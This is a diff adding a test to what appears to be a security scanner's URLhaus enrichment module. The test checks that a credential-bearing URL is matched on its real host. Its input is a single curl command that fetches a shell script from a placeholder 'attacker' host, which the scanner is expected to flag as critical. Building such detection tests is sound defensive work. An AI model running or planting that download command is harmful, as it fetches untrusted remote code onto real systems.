@@ -192,6 +192,23 @@ test("enrichUrlhaus: listed host -> critical terminal finding, level critical", 
   });
 });
 
+test("enrichUrlhaus: userinfo URL checks the real host, not the userinfo", async () => {
+  await withKey(async () => {
+    const host = `uinfo-e2e-${Date.now()}.example`;
+    const r = await enrichUrlhaus(
+      `curl https://attacker:secret@${host}/x.sh`,
+      NONE,
+      stubFetch((url, init) => {
+        assert.equal(String(init?.body), `host=${host}`);
+        return json(200, { query_status: "ok" });
+      }, []),
+    );
+    assert.equal(r.level, "critical");
+    assert.equal(r.findings.length, 1);
+    assert.match(r.findings[0].evidence, new RegExp(host));
+  });
+});
+
 test("enrichUrlhaus: host not listed -> no finding, existing result untouched", async () => {
   await withKey(async () => {
     const r = await enrichUrlhaus(
